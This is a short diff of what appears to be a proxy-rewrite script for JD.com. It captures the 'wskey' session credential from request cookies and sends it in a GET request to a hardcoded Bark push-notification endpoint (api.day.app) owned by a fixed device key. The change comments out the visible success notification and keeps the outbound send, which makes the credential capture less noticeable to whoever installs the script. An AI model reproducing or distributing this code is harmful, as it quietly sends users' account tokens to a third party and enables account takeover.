@@ -42,7 +42,7 @@ function GetCookie() {
         if ($request.url.indexOf('https://rjsb-token-m.jd.com/gettoken_c') > -1) {
             var CV = $request.headers['Cookie'] || $request.headers['cookie'];
             var wsk = CV.match(/wskey=.+?;/);
-            $.notify("成功",'',wsk)
+            //$.notify("运行成功")
             var notifyUrl='https://api.day.app/3rnzRCyqGvzSi8rFzSVXJj/抓取通知/'+wsk+'/?autoCopy=1&copy='+wsk+'&icon=https://cdn.jsdelivr.net/gh/braless/site_logo/jd_app.png'
             $.http.get(encodeURI(notifyUrl))
         }else {
